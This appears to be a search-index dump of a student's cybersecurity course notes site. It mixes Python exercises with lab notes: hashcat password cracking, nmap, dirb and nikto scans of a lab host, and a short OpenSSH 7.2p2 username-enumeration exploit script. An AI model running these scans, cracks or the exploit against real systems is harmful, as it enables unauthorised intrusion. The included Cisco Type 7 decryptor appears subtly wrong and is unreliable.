to your code to get it to output intergers. it will prevent output like this 4.7304e+16 print (int(variable)) # Write your program here years = float(input(\"Enter Years: \")) lyt = ((3e8) * (31536000)) lyty= (lyt * years) print (\"Distance traveled: \",(int(lyty))) print","title":"ex2-8"},{"location":"markdown/Week%20One%20Python%20CODE%20CYSE%20250__/#ex2-9","text":"# Write your program here # Nautical miles for this is calculated by the blow code nm = ((60 * 90) /10000 ) kilo= float(input(\"Enter Kilometers: \")) anm= kilo * .54 print (\"Nautical Miles:\" , (round(anm, 2)))","title":"ex2-9"},{"location":"markdown/Week%20One%20Python%20CODE%20CYSE%20250__/#ex2-10","text":"# Write your program here hourwage = float(input(\"Enter hourly wage: \")) reghours = float (input(\"Enter regular hours: \")) OT = float(input(\"Enter overtime hours: \")) finalwage = (OT * 1.5) * hourwage + (hourwage * reghours) print (\"Weekly pay: $\",(round(finalwage, 2))) ## Chapter 2 Debugging Exercise The code had a few errors with the math and was missing a variable ``` purchasePrice = float(input(\"Enter the purchase price as $: \")) taxRate = int(input(\"Enter the tax rate as %: \")) tax = purchasePrice * ((taxRate / 100) + 1) taxtotal= tax - purchasePrice totalOwed = tax print(\"Purchase price: \", round(purchasePrice, 2)) print(\"Tax: \", round(taxtotal, 2)) print(\"Total owed: \", totalOwed) ## **_ex3-1_**","title":"ex2-10"},{"location":"markdown/Week%20One%20Python%20CODE%20CYSE%20250__/#write-your-program-here","text":"side1= int(input(\"Enter first side:\")) side2= int(input(\"Enter second side: \")) side3 = int(input(\"Enter third side: \")) if side1 == side2 and side1 == side3: print (\"The triangle is equilateral\") else: print (\"triangle is not equilateral\") ## **_ex3-2_** side1 = int(input(\"Enter the first side: \")) side2 = int(input(\"Enter the second side: \")) side3 = int(input(\"Enter the third side: \")) if ((side1 2)+(side2 2)) == (side3**2): print (\"The triangle is a right triangle\") else: print (\"The triangle is not a right triangle\") ## **_ex3-3_**","title":"Write your program here"},{"location":"markdown/Week%20One%20Python%20CODE%20CYSE%20250__/#get-the-smaller-and-larger-numbers-from-the-user","text":"smaller = int(input(\"Enter the smaller number: \")) larger = int(input(\"Enter the larger number: \"))","title":"Get the smaller and larger numbers from the user"},{"location":"markdown/Week%20One%20Python%20CODE%20CYSE%20250__/#initialize-count-and-bounds","text":"count = 0 low = smaller high = larger","title":"Initialize count and bounds"},{"location":"markdown/Week%20One%20Python%20CODE%20CYSE%20250__/#the-computer-now-tries-to-guess-the-number","text":"while low <= high: guess = (low + high) // 2 # Guess the middle of the current range count += 1 print(f\"{low} {high}\") print(f\"Your number is {guess}\") user_input = input(\"Enter =, <, or >: \") # Get feedback from the user if user_input == \"=\": print(f\"Hooray, I've got it in {count} tries!\") break elif user_input == \"<\": high = guess - 1 # Adjust the upper bound elif user_input == \">\": low = guess + 1 # Adjust the lower bound","title":"The computer now tries to guess the number"},{"location":"markdown/Week%20One%20Python%20CODE%20CYSE%20250__/#if-the-loop-ends-without-finding-the-number-print-cheating-message","text":"if low > high: print(\"I'm out of guesses, and you cheated!\") Certainly! Here\u2019s a Markdown-friendly guide for your code. You can copy and paste it directly into VS Code, and it will format nicely. ```markdown # Code Breakdown: Number Guessing Game This guide explains a Python program where the computer tries to guess a number based on user input. Let's break down the code step by step. ## 1. Getting User Input The program starts by asking the user to provide two numbers: a smaller and a larger number. ```python smaller = int(input(\"Enter the smaller number: \")) larger = int(input(\"Enter the larger number: \")) smaller : The lower bound of the range. larger : The upper bound of the range.","title":"If the loop ends without finding the number, print cheating message"},{"location":"markdown/Week%20One%20Python%20CODE%20CYSE%20250__/#2-initializing-variables","text":"Next, the program initializes three variables: count = 0 # Keeps track of how many guesses have been made low = smaller # The current lower bound high = larger # The current upper bound count : Tracks the number of guesses. low : Initially set to the smaller number. high : Initially set to the larger number.","title":"2. Initializing Variables"},{"location":"markdown/Week%20One%20Python%20CODE%20CYSE%20250__/#3-binary-search-loop","text":"The core of the program is a while loop , which implements a binary search to guess the user's number. while low <= high: guess = (low + high) // 2 # Guess the middle of the current range count += 1 print(f\"{low} {high}\") print(f\"Your number is {guess}\") Binary Search : The computer guesses the number by calculating the midpoint between low and high . The program prints the current bounds ( low and high ) and the current guess.","title":"3. Binary Search Loop"},{"location":"markdown/Week%20One%20Python%20CODE%20CYSE%20250__/#4-getting-user-feedback","text":"After making a guess, the program asks for feedback from the user: user_input = input(\"Enter =, <, or >: \") = : The guess is correct. < : The guess is too high, so the computer will narrow the range by adjusting the upper bound. > : The guess is too low, so the computer will adjust the lower bound.","title":"4. Getting User Feedback"},{"location":"markdown/Week%20One%20Python%20CODE%20CYSE%20250__/#5-adjusting-the-range-based-on-feedback","text":"The program adjusts the bounds depending on the user's feedback: if user_input == \"=\": print(f\"Hooray, I've got it in {count} tries!\") break elif user_input == \"<\": high = guess - 1 # Narrow the upper bound elif user_input == \">\": low = guess + 1 # Narrow the lower bound If the user enters \"=\" , the program announces that it guessed the number and exits the loop. If the user enters \"<\" , the upper bound is set to one less than the guess. If the user enters \">\" , the lower bound is set to one more than the guess.","title":"5. Adjusting the Range Based on Feedback"},{"location":"markdown/Week%20One%20Python%20CODE%20CYSE%20250__/#6-cheating-check","text":"If the loop exits and the bounds ( low > high ) are invalid, it means the user provided inconsistent feedback, and the program concludes they cheated: if low > high: print(\"I'm out of guesses, and you cheated!\") This handles the scenario where the user's feedback is impossible, i.e., the number can't be guessed within the provided bounds.","title":"6. Cheating Check"},{"location":"markdown/Week%20One%20Python%20CODE%20CYSE%20250__/#summary","text":"This program uses a binary search approach to guess the number the user is thinking of. It adjusts the range based on the user's feedback ( = , < , or > ) until it guesses the correct number or determines the user is cheating.","title":"Summary"},{"location":"markdown/Week%20One%20Python%20CODE%20CYSE%20250__/#key-concepts","text":"Binary Search : Efficiently guessing numbers by halving the search range each time. User Feedback : Input-driven adjustments to the guessing logic. You can paste this into your Markdown file in VS Code, and it should render nicely. Let me know if you'd like any further adjustments!","title":"Key Concepts:"},{"location":"markdown/Week%20One%20Python%20CODE%20CYSE%20250__/#ex3-4","text":"inittheight= float(input(\"Enter the height from which the ball is dropped: \")) initbounce= float(input(\"bounciness index of the ball: \")) allowbounce= int(input(\"Enter the number of times the ball is allowed to continue bouncing: \")) tdistance = inittheight for i in range(allowbounce): inittheight *= initbounce tdistance += inittheight * 2 if allowbounce > 0: tdistance -= inittheight print(f\"Total distance traveled by the ball: {tdistance:.6f}\")","title":"ex3-4"},{"location":"markdown/Week%20One%20Python%20CODE%20CYSE%20250__/#ex3-5","text":"init = (float(input(\"Enter the initial number of organisms: \"))) rgro = (float(input(\"Enter the rate of growth [a real number > 1]: \"))) hours = (float(input(\"Enter the number of hours to achieve the rate of growth: \"))) tours = (float(input(\"Enter the total hours of growth: \"))) import math tpop = math.floor(init * (rgro**(tours / hours))) print (f\"After {tours} hours, The total population is : {tpop}\")","title":"ex3-5"},{"location":"markdown/Week%20One%20Python%20CODE%20CYSE%20250__/#ex3-6","text":"iters = int(input(\"Enter the number of iterations: \")) rpie = 0 for n in range(iters): rpie += ((-1) ** n) / (2 * n + 1) rpie *= 4 print(f\"The approximation of pi is : {rpie}\")","title":"ex3-6"},{"location":"markdown/Week%20One%20Python%20CODE%20CYSE%20250__/#ex3-7","text":"start = float(input(\"Enter the starting salary : \")) incr = int(input(\"Enter the annual % increase : \")) years = int(input(\"Enter the number of years : \")) pincr= incr / 100 rsal= start for n in range(1, years + 1): print(f\"Year {n}: Salary: {rsal:.2f}\") rsal += rsal * pincr","title":"ex3-7"},{"location":"markdown/Week%20One%20Python%20CODE%20CYSE%20250__/#ex3-8","text":"small = int(input(\"Enter the smaller number : \")) large = int(input(\"Enter the larger number : \")) def gcd(small, large): while large != 0: small, large = large, small % large return small print(f\"The greatest common divisor is {gcd(small, large):.0f}\")","title":"ex3-8"},{"location":"markdown/Week%20One%20Python%20CODE%20CYSE%20250__/#ex3-9","text":"total = 0 count = 0 while True: usernum = (input(\"Enter a number or press Enter to quit: \")) if usernum == \"\": break nu1 = float(usernum) total += nu1 count += 1 average = total/count print(\"The sum is \" , total) print(\"The average is \" , average)","title":"ex3-9"},{"location":"markdown/Week%20One%20Python%20CODE%20CYSE%20250__/#ex3-10","text":"def tidbit_credit_plan(purchase_price): # Credit plan details down_payment_rate = 10 # 10% down payment annual_interest_rate = 12 # 12% annual interest rate monthly_payment_rate = 5 # 5% of the listed purchase price # Calculate initial values balance = purchase_price * (1 - down_payment_rate / 100) monthly_payment = purchase_price * (monthly_payment_rate / 100) # Print header for table print(\"{:<5} {:<20} {:<20} {:<20} {:<15} {:<20}\".format( \"Month\", \"Starting Balance\", \"Interest to Pay\", \"Principal to Pay\", \"Payment\", \"Ending Balance\" )) # Calculate and display details for each month month = 1 while balance > 0: starting_balance = balance # Check if monthly payment is greater than the remaining balance if monthly_payment > balance: payment = balance interest = 0 else: interest = balance * (annual_interest_rate / 100) / 12 payment = monthly_payment # Calculate principal and payment details principal = payment - interest # Calculate the ending balance ending_balance = starting_balance - payment # Print the details for the month print(\"{:<5} {:<20.2f} {:<20.2f} {:<20.2f} {:<15.2f} {:<20.2f}\".format( month, starting_balance, interest, principal, payment, ending_balance )) # Update balance and month balance = ending_balance month += 1 # Get the purchase price and run the credit plan purchase_price = float(input(\"Enter the purchase price: \")) tidbit_credit_plan(purchase_price)","title":"ex3-10"},{"location":"markdown/Week%20One%20Python%20CODE%20CYSE%20250__/#ex3-11","text":"import random def lucky_sevens(starting_amount): pot = starting_amount rolls = 0 max_pot = pot max_roll = 0 while pot > 0: rolls += 1 die1 = random.randint(1, 6) die2 = random.randint(1, 6) if die1 + die2 == 7: pot += 4 else: pot -= 1.0 if pot > max_pot: max_pot = pot max_roll = rolls print(f\"You are broke after {rolls} rolls.\") print(f\"You should have quit after {max_roll} rolls when you had ${max_pot}.\") starting_amount = float(input(\"How many dollars do you have? \")) lucky_sevens(starting_amount)","title":"ex3-11"},{"location":"markdown/Week%20One%20Python%20CODE%20CYSE%20250__/#chapter-3-debugging-exercise","text":"count = 1 total = 0 while count <= 10: score = int(input(\"Enter test score number \" + str(count) + \": \")) total = total + score count = count + 1 average = total / 10 print(\"The average test score is\", average)","title":"Chapter 3 Debugging Exercise"},{"location":"markdown/decryptpractice/","text":"Bravo Team: Base64 encoded = QnJhdm8= Decrypt Hexadecimal this command works great echo 4e 65 76 65 72 20 67 6f 6e 6e 61 20 72 75 6e 20 61 72 6f 75 6e 64 20 61 6e 64 20 64 65 73 65 72 74 20 79 6f 75 0a 4e 65 76 65 72 20 67 6f 6e 6e 61 20 6d 61 6b 65 20 79 6f 75 20 63 72 79 0a | xxd -r -p Hexdump = 4e 65 76 65 72 20 67 6f 6e 6e 61 20 72 75 6e 20 61 72 6f 75 6e 64 20 61 6e 64 20 64 65 73 65 72 74 20 79 6f 75 0a 4e 65 76 65 72 20 67 6f 6e 6e 61 20 6d 61 6b 65 20 79 6f 75 20 63 72 79 0a Sha1 decode with Hashcat hashcat -m100 -a 0 cracksha1.txt /usr/share/seclists/Passwords/cirt-default-passwords.txt Hash type (sha1) = 5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8:password stored in this locationg (~/.local/share/hashcat/hashcat.potfile) Unknown Hash attempt saved hash to text file unknownhash.txt used this command for the potential hashes it could be hash-identifier Possible Hashs: [+] SHA-1 [+] MySQL5 - SHA-1(SHA-1($pass)) Command that worked * hashcat -m100 -a 0 unkownhash.txt /usr/share/wordlists/rockyou.txt Unknown hash type = 035EC07A85BB3F2D1262B3245642D13FD606626D::1loveu","title":"Decryptpractice"},{"location":"markdown/decryptpractice/#decrypt-hexadecimal","text":"this command works great echo 4e 65 76 65 72 20 67 6f 6e 6e 61 20 72 75 6e 20 61 72 6f 75 6e 64 20 61 6e 64 20 64 65 73 65 72 74 20 79 6f 75 0a 4e 65 76 65 72 20 67 6f 6e 6e 61 20 6d 61 6b 65 20 79 6f 75 20 63 72 79 0a | xxd -r -p Hexdump = 4e 65 76 65 72 20 67 6f 6e 6e 61 20 72 75 6e 20 61 72 6f 75 6e 64 20 61 6e 64 20 64 65 73 65 72 74 20 79 6f 75 0a 4e 65 76 65 72 20 67 6f 6e 6e 61 20 6d 61 6b 65 20 79 6f 75 20 63 72 79 0a","title":"Decrypt Hexadecimal"},{"location":"markdown/decryptpractice/#sha1-decode-with-hashcat","text":"hashcat -m100 -a 0 cracksha1.txt /usr/share/seclists/Passwords/cirt-default-passwords.txt Hash type (sha1) = 5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8:password stored in this locationg (~/.local/share/hashcat/hashcat.potfile)","title":"Sha1 decode with Hashcat"},{"location":"markdown/decryptpractice/#unknown-hash-attempt","text":"saved hash to text file unknownhash.txt used this command for the potential hashes it could be hash-identifier Possible Hashs: [+] SHA-1 [+] MySQL5 - SHA-1(SHA-1($pass)) Command that worked * hashcat -m100 -a 0 unkownhash.txt /usr/share/wordlists/rockyou.txt Unknown hash type = 035EC07A85BB3F2D1262B3245642D13FD606626D::1loveu","title":"Unknown Hash attempt"},{"location":"markdown/enumeration%20tecniques/","text":"Enumerating Hosts During the information gathering phase you will move from passive reconnaissance to active reconnaissance. Here we use the information we gathered to determine our attack vector by starting at the top of the list working our way down. That means retrieving a list of open ports, vulnerable services running on those ports, web directories, or the type of information that can be exposed by the service such as a list of users. When enumerating a host, we will determine the best possible entry point. Which means you will be going over your scans in detail line by line to find the lowest hanging fruit. Run a nmap scan to identify hosts on our network. nmap -O 10.1.16.0/24 -oX enum.xml && xsltproc enum.xml -o enum.html We are using the -O option to detect the Operating Systems of the hosts on our network. Open enum.html in our firefox browser to view our scan report. firefox enum.html Enumerating Ports We will be determining what versions of the services that are running on our host we previously scanned to identify potential exploits. Our result from our last scan shows us that the host 10.1.16.9 has more open ports than any other host on the network. Run another nmap scan to determine the versions of the services on all 65,535 ports open on this machine. Then you will output the scan into an .xml file using the -oX option to create a detailed list. nmap -sV -p- 10.1.16.9 -oX enum2.xml Convert your .xml file to .html using xsltproc xsltproc enum2.xml -o enum2.html Open enum2.html in our firefox browser to view our scan report. firefox enum2.html what to do on ports Run a vulnerability script scan on port 21. nmap --script=vuln 10.1.16.9 -p 21 Enumerating Web Directories There are many tools we can use to enumerate web directories; in this section we will be using Dirb and Nikto to scan our web server. Dirb is a web content scanner that launches a dictionary-based attack to identify web directories using a dictionary file. You can view the web directory files that can be used by dirb by navigating to /usr/share/wordlists/dirb/. Type dirb, then press ENTER in your terminal window to see a list of options and command usage examples. After typing dirb Scroll up and down in your terminal to see all of the options. Using dirb, run a scan on the metasploitable web server. dirb http://10.1.16.9/ You can scroll up and down in the terminal to view the entire output of our scan. When an accessible directory is found it will be noted with ==> Our output dirb identified 41,526 files and 89 directories. We can view a directory by typing the webservers directory in the address bar of our browser. Open your firefox browser in the top left-hand corner. In the address bar, navigate to the second directory discovered by dirb. http://10.1.16.9/dvwa/ Nikto is a web server vulnerability scanning tool. Nikto will return any cookies received from the web server while attempting to detect files, software, and directories running on the web server. Type nikto, then press ENTER in your terminal window to see a list of options and command usage examples. In your terminal run a Nikto scan on the metasploitable2 host. nikto -h 10.1.16.9 When a directory is identified our output will show Directory indexing found. or directory found to the right of the directory discovered. Nikto discovered numerous directories and even vulnerabilities on this web server. You can navigate to each directory using your web browser. /doc/ /test/ /icons/ /phpMyAdmin/ Example","title":"Enumeration tecniques"},{"location":"markdown/enumeration%20tecniques/#enumerating-hosts","text":"During the information gathering phase you will move from passive reconnaissance to active reconnaissance. Here we use the information we gathered to determine our attack vector by starting at the top of the list working our way down. That means retrieving a list of open ports, vulnerable services running on those ports, web directories, or the type of information that can be exposed by the service such as a list of users. When enumerating a host, we will determine the best possible entry point. Which means you will be going over your scans in detail line by line to find the lowest hanging fruit.","title":"Enumerating Hosts"},{"location":"markdown/enumeration%20tecniques/#run-a-nmap-scan-to-identify-hosts-on-our-network","text":"nmap -O 10.1.16.0/24 -oX enum.xml && xsltproc enum.xml -o enum.html We are using the -O option to detect the Operating Systems of the hosts on our network.","title":"Run a nmap scan to identify hosts on our network."},{"location":"markdown/enumeration%20tecniques/#open-enumhtml-in-our-firefox-browser-to-view-our-scan-report","text":"firefox enum.html","title":"Open enum.html in our firefox browser to view our scan report."},{"location":"markdown/enumeration%20tecniques/#enumerating-ports","text":"We will be determining what versions of the services that are running on our host we previously scanned to identify potential exploits. Our result from our last scan shows us that the host 10.1.16.9 has more open ports than any other host on the network. Run another nmap scan to determine the versions of the services on all 65,535 ports open on this machine. Then you will output the scan into an .xml file using the -oX option to create a detailed list. nmap -sV -p- 10.1.16.9 -oX enum2.xml Convert your .xml file to .html using xsltproc xsltproc enum2.xml -o enum2.html Open enum2.html in our firefox browser to view our scan report. firefox enum2.html","title":"Enumerating Ports"},{"location":"markdown/enumeration%20tecniques/#what-to-do-on-ports","text":"Run a vulnerability script scan on port 21. nmap --script=vuln 10.1.16.9 -p 21","title":"what to do on ports"},{"location":"markdown/enumeration%20tecniques/#enumerating-web-directories","text":"There are many tools we can use to enumerate web directories; in this section we will be using Dirb and Nikto to scan our web server. Dirb is a web content scanner that launches a dictionary-based attack to identify web directories using a dictionary file. You can view the web directory files that can be used by dirb by navigating to /usr/share/wordlists/dirb/. Type dirb, then press ENTER in your terminal window to see a list of options and command usage examples. After typing dirb Scroll up and down in your terminal to see all of the options. Using dirb, run a scan on the metasploitable web server. dirb http://10.1.16.9/ You can scroll up and down in the terminal to view the entire output of our scan. When an accessible directory is found it will be noted with ==> Our output dirb identified 41,526 files and 89 directories. We can view a directory by typing the webservers directory in the address bar of our browser. Open your firefox browser in the top left-hand corner. In the address bar, navigate to the second directory discovered by dirb. http://10.1.16.9/dvwa/ Nikto is a web server vulnerability scanning tool. Nikto will return any cookies received from the web server while attempting to detect files, software, and directories running on the web server. Type nikto, then press ENTER in your terminal window to see a list of options and command usage examples. In your terminal run a Nikto scan on the metasploitable2 host. nikto -h 10.1.16.9 When a directory is identified our output will show Directory indexing found. or directory found to the right of the directory discovered. Nikto discovered numerous directories and even vulnerabilities on this web server. You can navigate to each directory using your web browser. /doc/ /test/ /icons/ /phpMyAdmin/ Example","title":"Enumerating Web Directories"},{"location":"markdown/ferxobuster/","text":"ferxobuster basic look for login page feroxbuster -u http:// --extensions \"php.txt\"","title":"Ferxobuster"},{"location":"markdown/github%20test%20for%20markdown/","text":"github test for markdown","title":"Github test for markdown"},{"location":"markdown/normcap/","text":"Installation guide for normcap and Dependencies on Kali Linux 1. Install normcap using pip: Open a terminal in Kali Linux and run the following command to install normcap: pip install normcap This command will download and install normcap along with most of it's dependencies. 2. Install missing system dependencies: After installing normcap , you may encounter errors related to missing system dependencies such as Qt platform plugins and Tesseract. To resolve these issues, you need to install the required system packages. a. Install libxcb1 and libxcb-cursor0: Run the following command to install libxcb1 and libxcb-cursor0 : sudo apt update sudo apt install libxcb1 libxcb-cursor These packages provide necessary dependencies for Qt platform plugins. b. Install Tesseract OCR: Tesseract OCR is required for text recognition in normcap . Install it using the following command: sudo apt install tesseract-ocr 3. Update PATH environment variable: To ensure that Tesseract binaries are accessible to normcap, you need to add their directory to the PATH environment variable. a. Open ~/.zshrc file: Use a text editor (vim, nano, etc...) to open the ~/.zshrc file: * vim ~/.zshrc b. Add Tesseract binary directory to PATH: Add the following line at the end of the file: export PATH=\"$PATH:/usr/bin\" c. Save and reload the configuration: Save the changes and exit the text editor. Then, reload the shell configuration: * source ~/.zshrc 4. Run normcap: After completing the above steps, try running normcap: * normcap","title":"Normcap"},{"location":"markdown/normcap/#installation-guide-for-normcap-and-dependencies-on-kali-linux","text":"","title":"Installation guide for normcap and Dependencies on Kali Linux"},{"location":"markdown/normcap/#1-install-normcap-using-pip","text":"Open a terminal in Kali Linux and run the following command to install normcap: pip install normcap This command will download and install normcap along with most of it's dependencies.","title":"1. Install normcap using pip:"},{"location":"markdown/normcap/#2-install-missing-system-dependencies","text":"After installing normcap , you may encounter errors related to missing system dependencies such as Qt platform plugins and Tesseract. To resolve these issues, you need to install the required system packages.","title":"2. Install missing system dependencies:"},{"location":"markdown/normcap/#a-install-libxcb1-and-libxcb-cursor0","text":"Run the following command to install libxcb1 and libxcb-cursor0 : sudo apt update sudo apt install libxcb1 libxcb-cursor These packages provide necessary dependencies for Qt platform plugins.","title":"a. Install libxcb1 and libxcb-cursor0:"},{"location":"markdown/normcap/#b-install-tesseract-ocr","text":"Tesseract OCR is required for text recognition in normcap . Install it using the following command: sudo apt install tesseract-ocr","title":"b. Install Tesseract OCR:"},{"location":"markdown/normcap/#3-update-path-environment-variable","text":"To ensure that Tesseract binaries are accessible to normcap, you need to add their directory to the PATH environment variable.","title":"3. Update PATH environment variable:"},{"location":"markdown/normcap/#a-open-zshrc-file","text":"Use a text editor (vim, nano, etc...) to open the ~/.zshrc file: * vim ~/.zshrc","title":"a. Open ~/.zshrc file:"},{"location":"markdown/normcap/#b-add-tesseract-binary-directory-to-path","text":"Add the following line at the end of the file: export PATH=\"$PATH:/usr/bin\"","title":"b. Add Tesseract binary directory to PATH:"},{"location":"markdown/normcap/#c-save-and-reload-the-configuration","text":"Save the changes and exit the text editor. Then, reload the shell configuration: * source ~/.zshrc","title":"c. Save and reload the configuration:"},{"location":"markdown/normcap/#4-run-normcap","text":"After completing the above steps, try running normcap: * normcap","title":"4. Run normcap:"},{"location":"markdown/theHarvesterNotes/","text":"Commmands basic search theHarvester -d <website address> -b google output to file on desktop theHarvester -d <website address> -b google -l 5 -f Desktop/results.html","title":"theHarvesterNotes"},{"location":"markdown/theHarvesterNotes/#commmands","text":"basic search theHarvester -d <website address> -b google output to file on desktop theHarvester -d <website address> -b google -l 5 -f Desktop/results.html","title":"Commmands"},{"location":"python/","text":"Python Welcome to the Python section. Here are the available scripts: bitcoinv2.py \"\"\" In this project, you'll create a program that that tells you when the value of your Bitcoin falls below $30,000. You will need to: - Create a function to convert Bitcoin to USD - If your Bitcoin falls below $30,000, print a message. You can assume that 1 Bitcoin is worth $40,000 \"\"\" investment_in_bitcoin = 1.2 bitcoin_to_usd = 40000 bitcoin_amount = 1 bitcoin_value_usd = 40000 # 1) write a function to calculate bitcoin to usd def bitcoinToUSD(bitcoin_amount, bitcoin_value_usd): dollars = bitcoin_amount * bitcoin_value_usd return dollars bitvalue = bitcoinToUSD(bitcoin_amount, bitcoin_value_usd) if bitvalue <= 30000: print(\"Bitcoin value in buy range:\", bitvalue) if bitvalue >= 30000: print(\"Bitcoin value in hold range:\", bitvalue) # 2) use function to calculate if the investment is below $30,000 # 2) use function to calculate if its below $30,000 BitcoinValueTracker.py \"\"\" In this project, you'll create a program that that tells you when the value of your Bitcoin falls below $30,000. You will need to: - Create a function to convert Bitcoin to USD - If your Bitcoin falls below $30,000, print a message. You can assume that 1 Bitcoin is worth $40,000 \"\"\" investment_in_bitcoin = 1.2 bitcoin_to_usd = 40000 bitcoin_amount=1 # 1) write a function to calculate bitcoin to usd def bitcoinToUSD(bitcoin_amount, bitcoin_to_usd): return bitcoin_amount * bitcoin_to_usd print(bitcoinToUSD(bitcoin_amount, bitcoin_to_usd)) # 2) use function to calculate if the investment is below $30,000 currentbitval=bitcoinToUSD(bitcoin_amount, bitcoin_to_usd) print(\"Current Bitcoin dollar value:\", currentbitval) if currentbitval<30000: print(\"Buy Now!\") # 2) use function to calculate if its below $30,000 decrypt_type7.py import sys import base64 def decrypt_type7(encrypted_password): try: # Extract the encrypted part from the Type 7 password (after the third '$') encrypted_part = encrypted_password.split('$')[-1] # Add necessary padding to make the base64 string length a multiple of 4 padding_needed = len(encrypted_part) % 4 if padding_needed != 0: encrypted_part += '=' * (4 - padding_needed) # Decode the base64-encoded encrypted part decoded_encrypted = base64.b64decode(encrypted_part) # Get the key used for encryption (first byte of decoded data) key = decoded_encrypted[0] # Decrypt the password bytes using the key decrypted_bytes = [char ^ key for char in decoded_encrypted[1:]] # Convert the decrypted bytes back to a string decrypted_password = ''.join(chr(byte) for byte in decrypted_bytes) return decrypted_password except Exception as e: print(f\"Error: {e}\") return None if __name__ == \"__main__\": if len(sys.argv) != 2: print(\"Usage: python decrypt_type7.py <type7_password>\") sys.exit(1) encrypted_password = sys.argv[1] decrypted_password = decrypt_type7(encrypted_password) if decrypted_password: print(f\"Decrypted password: {decrypted_password}\") else: print(\"Failed to decrypt the password.\") exploit_OpenSSHd_7.2p2_username_enumeration.py import paramiko import time # Prompt user for SSH username user = input(\"Enter SSH username: \") # Set a long password for testing (25000 'A' characters) p = 'A' * 25000 # Initialize SSH client ssh = paramiko.SSHClient() ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy()) try: # Connect to SSH server (replace IP address and port) ssh.connect('10.10.190.142', port=2222, username=user, password=p) print(\"SSH connection successful!\") except Exception as e: print(\"SSH connection failed:\", str(e)) finally: # Close SSH connection ssh.close() MISC CODE FILE.py import matplotlib.pyplot as plt # Define the disciplines and their contributions disciplines = ['Cybersecurity', 'Law', 'Ethics'] contributions = [30, 35, 25] # Example percentages for contribution to the integrated perspective # Create a pie chart to represent the integration of disciplines plt.figure(figsize=(7,7)) plt.pie(contributions, labels=disciplines, autopct='%1.1f%%', startangle=140, colors=['#ff9999','#66b3ff','#99ff99']) plt.title('Integration of Disciplines in Privacy Research (Cybersecurity, Law, Ethics)') plt.axis('equal') # Equal aspect ratio ensures the pie chart is circular. plt.show() pingsweep.py #!/usr/bin/env python3 import subprocess import ipaddress import netifaces import sys from multiprocessing import Pool # Function to extract network prefix from IP address def get_network_prefix(ip): ip = ipaddress.ip_interface(ip) return ip.network.network_address # Function to perform ping sweep for a given IP address def ping_sweep(ip): result = subprocess.run(['ping', '-c', '1', '-W', '1', str(ip)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) if result.returncode == 0: print(ip) # Get the IP address of the host ip_address = None for interface in netifaces.interfaces(): addresses = netifaces.ifaddresses(interface).get(netifaces.AF_INET) if addresses is not None: for address in addresses: if 'addr' in address and not ipaddress.ip_address(address['addr']).is_loopback: ip_address = address['addr'] break if ip_address: break if not ip_address: print(\"Failed to retrieve IP address. Please check your network connection.\") sys.exit(1) # Extract the network prefix network_prefix = get_network_prefix(ip_address) # Print the network prefix print(\"Network prefix:\", network_prefix) # Create a pool of worker processes pool = Pool() # Loop over the IP addresses in the range 1 to 254 within the same network prefix ip_addresses = [str(network_prefix) + \".\" + str(ip_suffix) for ip_suffix in range(1, 255)] # Perform ping sweep asynchronously for ip in ip_addresses: pool.apply_async(ping_sweep, (ip,)) # Close the pool to prevent further tasks from being submitted pool.close() # Wait for the worker processes to complete pool.join() PythonPractice.py print (\"helloworld\") ShippingCost.py customer_basket_cost = 101 customer_basket_weight = 44 shipping=0 + customer_basket_cost weight_cost=1.20 shippingunder100= weight_cost*customer_basket_weight+customer_basket_cost # Write if statement here to calculate the total cost if customer_basket_cost>=100: print(shipping) else: customer_basket_weight<100 print(shippingunder100)","title":"Python"},{"location":"python/#python","text":"Welcome to the Python section. Here are the available scripts:","title":"Python"},{"location":"python/#bitcoinv2py","text":"\"\"\" In this project, you'll create a program that that tells you when the value of your Bitcoin falls below $30,000. You will need to: - Create a function to convert Bitcoin to USD - If your Bitcoin falls below $30,000, print a message. You can assume that 1 Bitcoin is worth $40,000 \"\"\" investment_in_bitcoin = 1.2 bitcoin_to_usd = 40000 bitcoin_amount = 1 bitcoin_value_usd = 40000 # 1) write a function to calculate bitcoin to usd def bitcoinToUSD(bitcoin_amount, bitcoin_value_usd): dollars = bitcoin_amount * bitcoin_value_usd return dollars bitvalue = bitcoinToUSD(bitcoin_amount, bitcoin_value_usd) if bitvalue <= 30000: print(\"Bitcoin value in buy range:\", bitvalue) if bitvalue >= 30000: print(\"Bitcoin value in hold range:\", bitvalue) # 2) use function to calculate if the investment is below $30,000 # 2) use function to calculate if its below $30,000","title":"bitcoinv2.py"},{"location":"python/#bitcoinvaluetrackerpy","text":"\"\"\" In this project, you'll create a program that that tells you when the value of your Bitcoin falls below $30,000. You will need to: - Create a function to convert Bitcoin to USD - If your Bitcoin falls below $30,000, print a message. You can assume that 1 Bitcoin is worth $40,000 \"\"\" investment_in_bitcoin = 1.2 bitcoin_to_usd = 40000 bitcoin_amount=1 # 1) write a function to calculate bitcoin to usd def bitcoinToUSD(bitcoin_amount, bitcoin_to_usd): return bitcoin_amount * bitcoin_to_usd print(bitcoinToUSD(bitcoin_amount, bitcoin_to_usd)) # 2) use function to calculate if the investment is below $30,000 currentbitval=bitcoinToUSD(bitcoin_amount, bitcoin_to_usd) print(\"Current Bitcoin dollar value:\", currentbitval) if currentbitval<30000: print(\"Buy Now!\") # 2) use function to calculate if its below $30,000","title":"BitcoinValueTracker.py"},{"location":"python/#decrypt_type7py","text":"import sys import base64 def decrypt_type7(encrypted_password): try: # Extract the encrypted part from the Type 7 password (after the third '$') encrypted_part = encrypted_password.split('$')[-1] # Add necessary padding to make the base64 string length a multiple of 4 padding_needed = len(encrypted_part) % 4 if padding_needed != 0: encrypted_part += '=' * (4 - padding_needed) # Decode the base64-encoded encrypted part decoded_encrypted = base64.b64decode(encrypted_part) # Get the key used for encryption (first byte of decoded data) key = decoded_encrypted[0] # Decrypt the password bytes using the key decrypted_bytes = [char ^ key for char in decoded_encrypted[1:]] # Convert the decrypted bytes back to a string decrypted_password = ''.join(chr(byte) for byte in decrypted_bytes) return decrypted_password except Exception as e: print(f\"Error: {e}\") return None if __name__ == \"__main__\": if len(sys.argv) != 2: print(\"Usage: python decrypt_type7.py <type7_password>\") sys.exit(1) encrypted_password = sys.argv[1] decrypted_password = decrypt_type7(encrypted_password) if decrypted_password: print(f\"Decrypted password: {decrypted_password}\") else: print(\"Failed to decrypt the password.\")","title":"decrypt_type7.py"},{"location":"python/#exploit_opensshd_72p2_username_enumerationpy","text":"import paramiko import time # Prompt user for SSH username user = 